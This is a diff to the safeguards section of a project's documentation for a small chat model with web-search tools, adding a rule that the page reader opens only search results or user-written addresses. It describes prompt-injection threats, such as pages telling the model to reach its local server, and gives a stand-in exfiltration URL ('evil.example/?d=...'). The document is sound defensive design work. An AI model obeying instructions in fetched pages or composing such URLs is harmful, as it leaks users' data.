@@ -26,7 +26,10 @@ Safeguards, each of which has a test:
    range, link-local or the metadata address, checked on the connection itself, so a redirect or a DNS trick cannot get round it.
    The chat model's own server is on `127.0.0.1` behind a token; a page that tells the model to open it gets a refusal.
 3. **The web is data.** Tool results are labelled as untrusted page text, and the system prompt says instructions inside them are not
-   followed. A 1.7B model is not a strong defence, so the tools can only read; none writes, opens or runs anything.
+   followed. A 1.7B model is not a strong defence, so the tools can only read; none writes, opens or runs anything. And a page
+   cannot make the model send data out through a fetch: `read_page` opens only addresses that came back from this answer's searches
+   or that the person wrote, never one the model composed (a composed `https://evil.example/?d=...` is a GET that carries data).
+   The search words are still the model's own, and go to DuckDuckGo or Wikipedia: a residual risk, named in the README.
 4. **Bounded.** 10 s per request, 1.5 MB per page, HTML and plain text only, 5 results per search.
 5. **Honest failures.** DuckDuckGo asks for a check after a burst of searches from one address (seen while testing: HTTP 202). The search
    then goes to Wikipedia's API, which is official, keyless and does not block, though it only knows an encyclopedia's subjects. When
